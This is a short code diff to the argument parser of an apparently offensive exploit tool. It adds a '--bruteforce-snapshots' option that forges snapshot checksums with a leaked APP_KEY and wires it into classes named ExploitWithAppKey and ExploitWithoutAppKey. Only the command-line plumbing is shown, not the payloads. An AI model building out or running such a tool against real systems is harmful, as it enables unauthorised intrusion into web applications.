@@ -18,12 +18,15 @@ def main():
     parser.add_argument("-d", "--debug", help="Enable debug output", action="store_true")
     parser.add_argument("-F", "--force", help="Force exploit even if version does not seems to be vulnerable", action="store_true")
     parser.add_argument("-c", "--check", help="Only check if the remote target is vulnerable (only revelant for the exploit without the APP_KEY)", action="store_true")
+    parser.add_argument("-b", "--bruteforce-snapshots", help="Tries to bruteforce common snapshots by crafting the checksum with APP_KEY", action="store_true")
 
     args = parser.parse_args()
+    if args.bruteforce_snapshots and args.app_key is None:
+        parser.error("--bruteforce-snapshots requires an APP_KEY (-a) to craft the checksum.")
     if args.app_key is not None:
-        exploit = ExploitWithAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.app_key)
+        exploit = ExploitWithAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.app_key, args.bruteforce_snapshots)
     else:
-        exploit = ExploitWithoutAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.check, args.force)
+        exploit = ExploitWithoutAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.check, args.force, args.bruteforce_snapshots)
     exploit.run()
 
 if __name__ == "__main__":
